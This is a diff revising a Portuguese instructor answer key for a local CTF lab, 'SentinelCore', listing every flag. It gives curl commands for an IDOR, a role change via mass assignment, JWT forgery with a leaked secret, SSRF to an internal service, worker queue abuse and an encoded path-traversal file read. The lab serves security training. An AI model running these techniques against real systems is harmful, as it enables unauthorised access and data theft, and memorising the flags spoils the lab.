@@ -1,18 +1,18 @@
 # Walkthrough - Lab 04 SentinelCore
 
-Solucao completa para instrutores do **Lab 04 - SentinelCore**.
+Gabarito completo para instrutores do **Lab 04 - SentinelCore**.
 
-Escopo autorizado:
+## Escopo autorizado
 
 ```text
 http://127.0.0.1:8094
 ```
 
-Este walkthrough foca exploracao manual. Os comandos `curl` servem como alternativa de validacao e para reproduzir requests capturadas no Burp.
+Nao use este walkthrough contra qualquer alvo fora do ambiente local autorizado.
 
-## 0. Preparacao
+## Como subir o lab
 
-Suba o lab:
+Dentro do repositorio:
 
 ```bash
 cd ~/ctf-labs/lab-04-sentinelcore
@@ -26,9 +26,31 @@ BASE=http://127.0.0.1:8094
 COOKIE=/tmp/lab04-sentinel.cookies
 ```
 
-## 1. Login como intern
+## Credenciais iniciais
 
-Acesse o navegador:
+```text
+intern / intern2026
+```
+
+## Visao geral da cadeia
+
+A cadeia esperada combina varias falhas pequenas:
+
+1. Login inicial como `intern`.
+2. Inspecao do JavaScript publico para mapear endpoints.
+3. BOLA/IDOR em detalhes de alertas.
+4. Mass Assignment para alterar a role para `analyst`.
+5. Debug disclosure e build artifact leak para obter material sensivel.
+6. JWT forgery para admin.
+7. Acesso admin e SSRF para o servico `internal-admin`.
+8. Proxy com `x-internal-token` para consultar endpoints internos.
+9. Template context disclosure.
+10. Queue poisoning / worker abuse e leitura de output do worker.
+11. Arbitrary file read final para ler a flag em disco.
+
+## 1. Login inicial
+
+Acesse no navegador:
 
 ```text
 http://127.0.0.1:8094
@@ -52,20 +74,20 @@ curl -i -c "$COOKIE" \
 Valide a sessao:
 
 ```bash
-curl -s -b "$COOKIE" "$BASE/api/v2/me"
+curl -s -b "$COOKIE" "$BASE/api/v2/me" | jq
 ```
 
 O usuario inicial tem role `viewer`.
 
 ## 2. Inspecao do JavaScript
 
-No dashboard, abra DevTools ou acesse diretamente:
+Abra DevTools no dashboard ou acesse diretamente:
 
 ```text
 http://127.0.0.1:8094/static/js/sentinel.bundle.js
 ```
 
-O bundle revela nomes de endpoints e formatos esperados:
+O bundle revela endpoints e formatos uteis:
 
 - `/api/v2/alerts`
 - `/api/v2/alerts/{id}`
@@ -79,23 +101,23 @@ O bundle revela nomes de endpoints e formatos esperados:
 - `/api/v2/jobs/output?file={name}`
 - `/api/v2/admin/diagnostics/read?file=app.log`
 
-Tambem aparecem nomes internos como `internal-admin`, `sentinel:jobs` e `/shared`.
+Tambem aparecem pistas sobre `internal-admin`, `sentinel:jobs` e `/shared`.
 
-## 3. BOLA / IDOR em alertas
+## 3. BOLA/IDOR
 
-Liste os alertas visiveis:
-
-```bash
-curl -s -b "$COOKIE" "$BASE/api/v2/alerts"
-```
-
-O endpoint lista apenas alertas do `owner_id` do usuario. Agora teste leitura direta de objetos por ID:
+Liste os alertas visiveis para o usuario:
 
 ```bash
-curl -s -b "$COOKIE" "$BASE/api/v2/alerts/1002"
+curl -s -b "$COOKIE" "$BASE/api/v2/alerts" | jq
 ```
 
-O detalhe nao valida o `owner_id`, permitindo ler alerta de outro tenant.
+A listagem filtra por `owner_id`. Em seguida, leia diretamente um alerta de outro contexto:
+
+```bash
+curl -s -b "$COOKIE" "$BASE/api/v2/alerts/1002" | jq
+```
+
+O detalhe valida que o alerta existe, mas nao valida se pertence ao usuario atual.
 
 Flag:
 
@@ -103,7 +125,7 @@ Flag:
 flag{bola_alert_cross_tenant}
 ```
 
-Pista importante no alerta:
+Pista relevante do alerta:
 
 ```text
 Old debug health checks referenced auth material as sentinelcore-dev-****.
@@ -111,20 +133,7 @@ Old debug health checks referenced auth material as sentinelcore-dev-****.
 
 ## 4. Mass Assignment para analyst
 
-O bundle mostra `PATCH /api/v2/me/profile`. Envie um JSON com campo extra `role`.
-
-No Burp Repeater, capture ou monte:
-
-```http
-PATCH /api/v2/me/profile HTTP/1.1
-Content-Type: application/json
-Cookie: token=...
-
-{
-  "displayName": "SOC Intern",
-  "role": "analyst"
-}
-```
+O bundle indica `PATCH /api/v2/me/profile`. O endpoint aceita JSON e bloqueia apenas alguns campos. Envie um campo extra `role`.
 
 Com `curl`:
 
@@ -135,7 +144,13 @@ curl -i -b "$COOKIE" -c "$COOKIE" \
   -d '{"displayName":"SOC Intern","role":"analyst"}'
 ```
 
-O app bloqueia `id`, `username`, `password` e rejeita `role=admin`, mas aceita `role=analyst` e emite novo JWT.
+O app bloqueia `id`, `username`, `password` e rejeita `role=admin`, mas aceita `role=analyst` e emite novo JWT no cookie.
+
+Valide a role efetiva:
+
+```bash
+curl -s -b "$COOKIE" "$BASE/api/v2/me" | jq
+```
 
 Flag:
 
@@ -143,18 +158,12 @@ Flag:
 flag{mass_assignment_analyst_role}
 ```
 
-Valide a role efetiva:
-
-```bash
-curl -s -b "$COOKIE" "$BASE/api/v2/me"
-```
-
 ## 5. Debug disclosure
 
 Com role `analyst`, acesse:
 
 ```bash
-curl -s -b "$COOKIE" "$BASE/api/v2/debug/health"
+curl -s -b "$COOKIE" "$BASE/api/v2/debug/health" | jq
 ```
 
 Retorno esperado:
@@ -180,10 +189,10 @@ flag{debug_secret_fragment_disclosed}
 Ainda como `analyst`, acesse o manifesto antigo:
 
 ```bash
-curl -s -b "$COOKIE" "$BASE/api/v2/artifacts/build-manifest"
+curl -s -b "$COOKIE" "$BASE/api/v2/artifacts/build-manifest" | jq
 ```
 
-O arquivo vazado contem:
+O artefato vazado contem:
 
 ```text
 JWT_SECRET=sentinelcore-dev-2026
@@ -196,25 +205,31 @@ Flag:
 flag{old_build_manifest_leaked_secrets}
 ```
 
-Esse vazamento conecta as proximas etapas: forjar JWT admin e usar token interno.
+Esses valores permitem as proximas etapas: forjar um JWT admin e autenticar no servico interno via proxy.
 
-## 7. Forge de JWT admin
+## 7. JWT forgery para admin
 
-O cookie `token` e um JWT assinado com HS256. Com o segredo vazado, crie um token com `role=admin`.
-
-Opcao pratica usando o container da aplicacao:
+O cookie `token` e um JWT assinado com HS256. Com o segredo vazado, gere um token admin dentro do container da aplicacao:
 
 ```bash
-ADMIN_TOKEN=$(docker compose exec -T sentinel-app node -e 'const jwt=require("jsonwebtoken"); process.stdout.write(jwt.sign({id:1,username:"intern",role:"admin",scope:["admin:read","alerts:read"]},"sentinelcore-dev-2026",{expiresIn:"3h"}));')
-ADMIN_COOKIE="token=$ADMIN_TOKEN"
+export ADMIN_TOKEN=$(docker exec lab04-sentinel-app node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({id:1,username:'intern',role:'admin',scope:['admin:read']}, 'sentinelcore-dev-2026'))")
 ```
 
-No Burp, a alternativa manual e decodificar o JWT atual, alterar a claim `role` para `admin`, assinar com `sentinelcore-dev-2026` e substituir o cookie.
-
-Valide acesso admin:
+Confira se a variavel recebeu um JWT real:
 
 ```bash
-curl -s -H "Cookie: $ADMIN_COOKIE" "$BASE/api/v2/admin/final"
+echo "$ADMIN_TOKEN"
+```
+
+O valor deve ter tres partes separadas por ponto. Nao exporte um placeholder como texto literal.
+
+## 8. Acesso admin
+
+Use o token em `Authorization: Bearer` para acessar a area admin:
+
+```bash
+curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
+  http://127.0.0.1:8094/api/v2/admin/final | jq
 ```
 
 Flag:
@@ -223,17 +238,17 @@ Flag:
 flag{jwt_forged_admin_access}
 ```
 
-A resposta tambem indica que a flag final esta em disco e requer uma primitiva de leitura.
+A resposta tambem informa que a flag final esta em disco e exige uma primitiva de leitura.
 
-## 8. SSRF para internal-admin
+## 9. SSRF para internal-admin
 
 O endpoint de integracao aceita uma URL e bloqueia apenas alguns nomes obvios como `localhost` e `127.0.0.1`. O nome Docker `internal-admin` continua acessivel pela rede interna.
 
 ```bash
-curl -s -H "Cookie: $ADMIN_COOKIE" \
+curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
   -H "Content-Type: application/json" \
   -d '{"url":"http://internal-admin:8081/status"}' \
-  "$BASE/api/v2/integrations/check"
+  "$BASE/api/v2/integrations/check" | jq
 ```
 
 Flag:
@@ -244,23 +259,23 @@ flag{ssrf_reached_internal_admin}
 
 Impacto: a aplicacao principal consegue fazer requests para um servico que nao esta exposto no host.
 
-## 9. Proxy interno com headers
+## 10. Proxy com x-internal-token
 
-O manifesto antigo vazou:
+O manifesto antigo vazou o token interno:
 
 ```text
 internal-admin-token-7f3a9c21
 ```
 
-O endpoint admin `/api/v2/integrations/proxy` aceita headers customizados. Use o token interno.
+O endpoint admin `/api/v2/integrations/proxy` aceita headers customizados. Envie `x-internal-token` para consultar o servico interno.
 
 Usuarios internos:
 
 ```bash
-curl -s -H "Cookie: $ADMIN_COOKIE" \
+curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
   -H "Content-Type: application/json" \
   -d '{"url":"http://internal-admin:8081/internal/users","headers":{"x-internal-token":"internal-admin-token-7f3a9c21"}}' \
-  "$BASE/api/v2/integrations/proxy"
+  "$BASE/api/v2/integrations/proxy" | jq
 ```
 
 Flag:
@@ -272,10 +287,10 @@ flag{internal_admin_token_accepted}
 Configuracao interna:
 
 ```bash
-curl -s -H "Cookie: $ADMIN_COOKIE" \
+curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
   -H "Content-Type: application/json" \
   -d '{"url":"http://internal-admin:8081/internal/config","headers":{"x-internal-token":"internal-admin-token-7f3a9c21"}}' \
-  "$BASE/api/v2/integrations/proxy"
+  "$BASE/api/v2/integrations/proxy" | jq
 ```
 
 Flag:
@@ -284,17 +299,17 @@ Flag:
 flag{internal_config_disclosed}
 ```
 
-O config confirma a fila `sentinel:jobs`, os tipos de job e o output em `/shared`.
+O config confirma a fila `sentinel:jobs`, tipos de job e output em `/shared`.
 
-## 10. Template context disclosure
+## 11. Template context disclosure
 
-O renderer nao usa `eval` nem executa codigo, mas disponibiliza contexto sensivel em placeholders.
+O renderizador de relatorios substitui placeholders simples, mas disponibiliza contexto sensivel.
 
 ```bash
-curl -s -H "Cookie: $ADMIN_COOKIE" \
+curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
   -H "Content-Type: application/json" \
   -d '{"title":"debug","template":"user={{user.username}} role={{user.role}} secret={{config.jwt_hint}} internal={{config.internal_token_hint}}"}' \
-  "$BASE/api/v2/reports/render"
+  "$BASE/api/v2/reports/render" | jq
 ```
 
 Flag:
@@ -303,17 +318,17 @@ Flag:
 flag{template_context_leaked}
 ```
 
-Licao: template injection nem sempre precisa virar RCE para ter impacto. Vazamento de contexto sensivel ja pode comprometer a cadeia.
+Licao: template context disclosure pode comprometer a cadeia mesmo sem execucao de codigo.
 
-## 11. Queue poisoning
+## 12. Queue poisoning / worker abuse
 
 Agora enfileire um job `token.debug`:
 
 ```bash
-curl -s -H "Cookie: $ADMIN_COOKIE" \
+curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
   -H "Content-Type: application/json" \
   -d '{"type":"token.debug","source":"manual","output":"worker-token.txt"}' \
-  "$BASE/api/v2/jobs"
+  "$BASE/api/v2/jobs" | jq
 ```
 
 Aguarde o worker consumir:
@@ -322,10 +337,12 @@ Aguarde o worker consumir:
 sleep 2
 ```
 
+## 13. Leitura de output do worker
+
 Leia o output gerado no volume compartilhado:
 
 ```bash
-curl -s -H "Cookie: $ADMIN_COOKIE" \
+curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
   "$BASE/api/v2/jobs/output?file=worker-token.txt"
 ```
 
@@ -337,39 +354,37 @@ flag{worker_queue_poisoned}
 
 O output tambem revela `WORKER_TOKEN`.
 
-## 12. Leitura de output do worker
-
 Valide o tipo `report.export`:
 
 ```bash
-curl -s -H "Cookie: $ADMIN_COOKIE" \
+curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
   -H "Content-Type: application/json" \
   -d '{"type":"report.export","source":"case-1002","output":"case-1002.txt"}' \
-  "$BASE/api/v2/jobs"
+  "$BASE/api/v2/jobs" | jq
 
 sleep 2
 
-curl -s -H "Cookie: $ADMIN_COOKIE" \
+curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
   "$BASE/api/v2/jobs/output?file=case-1002.txt"
 ```
 
 Valide tambem a primitiva insegura do worker `file.read`, limitada ao container do worker:
 
 ```bash
-curl -s -H "Cookie: $ADMIN_COOKIE" \
+curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
   -H "Content-Type: application/json" \
   -d '{"type":"file.read","source":"/worker/worker.js","output":"worker-source.txt"}' \
-  "$BASE/api/v2/jobs"
+  "$BASE/api/v2/jobs" | jq
 
 sleep 2
 
-curl -s -H "Cookie: $ADMIN_COOKIE" \
+curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
   "$BASE/api/v2/jobs/output?file=worker-source.txt" | head
 ```
 
-Essa etapa demonstra risco de fila confiando em jobs controlados por usuario administrativo.
+Essa etapa demonstra o risco de uma fila aceitar jobs controlados por usuario administrativo.
 
-## 13. Arbitrary File Read final
+## 14. Arbitrary file read final
 
 A area admin indicou que a flag final esta em disco. O bundle e o log apontam para:
 
@@ -381,21 +396,21 @@ base /app/logs
 Leitura normal:
 
 ```bash
-curl -s -H "Cookie: $ADMIN_COOKIE" \
+curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
   "$BASE/api/v2/admin/diagnostics/read?file=app.log"
 ```
 
 Tentativa direta com traversal literal deve ser bloqueada:
 
 ```bash
-curl -i -H "Cookie: $ADMIN_COOKIE" \
+curl -i -H "Authorization: Bearer $ADMIN_TOKEN" \
   "$BASE/api/v2/admin/diagnostics/read?file=../secrets/final.flag"
 ```
 
 O filtro bloqueia apenas `../` antes do decode. Codifique a barra:
 
 ```bash
-curl -s -H "Cookie: $ADMIN_COOKIE" \
+curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
   "$BASE/api/v2/admin/diagnostics/read?file=..%2fsecrets%2ffinal.flag"
 ```
 
@@ -405,7 +420,7 @@ Flag final:
 flag{sentinelcore_full_chain_compromised}
 ```
 
-## 14. Flags do Lab
+## 15. Lista de flags
 
 ```text
 flag{bola_alert_cross_tenant}
@@ -423,9 +438,20 @@ flag{sentinelcore_full_chain_compromised}
 
 ## Troubleshooting
 
-- Se `/api/v2/debug/health` retornar 403, refaca o `PATCH /api/v2/me/profile` e confirme que o cookie atualizado foi salvo.
-- Se rotas admin retornarem 403, confirme que o JWT admin foi assinado com `sentinelcore-dev-2026` e enviado como cookie `token`.
-- Se o output do worker retornar 404, aguarde alguns segundos e tente novamente.
-- Se `internal-admin` ou Redis responderem no host, ha erro de Compose. Eles devem aparecer apenas como `expose`, sem `ports`.
+- Se aparecer "authentication required" em rotas admin, provavelmente o token nao foi enviado, esta vazio, expirou ou foi exportado errado.
+- Nao usar literalmente `COLE_AQUI_O_TOKEN`.
+- Conferir com `echo "$ADMIN_TOKEN"`.
+- Gerar novamente o token com `docker exec` usando o comando da etapa de JWT forgery.
+- Se aparecer 403, o JWT pode ser valido, mas a role nao e admin.
+- Para problema no worker, usar:
+
+```bash
+docker logs lab04-worker
+```
+
+- Se o output do worker nao aparecer, aguardar alguns segundos e conferir o nome do arquivo em `/api/v2/jobs/output?file=...`.
+- Se a porta estiver ocupada, usar `docker ps` para identificar containers ativos e `docker compose down` dentro de `lab-04-sentinelcore`.
+- Se a role analyst nao mudar, conferir se o `PATCH` salvou o novo cookie com `-c`.
+- Se `/api/v2/debug/health` retornar 403, repita a etapa de Mass Assignment e valide `/api/v2/me`.
 - Se a leitura final retornar 403, use `%2f` em vez de `/` no traversal.
 - Se a leitura final retornar 404, confirme o caminho relativo a partir de `/app/logs`: `..%2fsecrets%2ffinal.flag`.
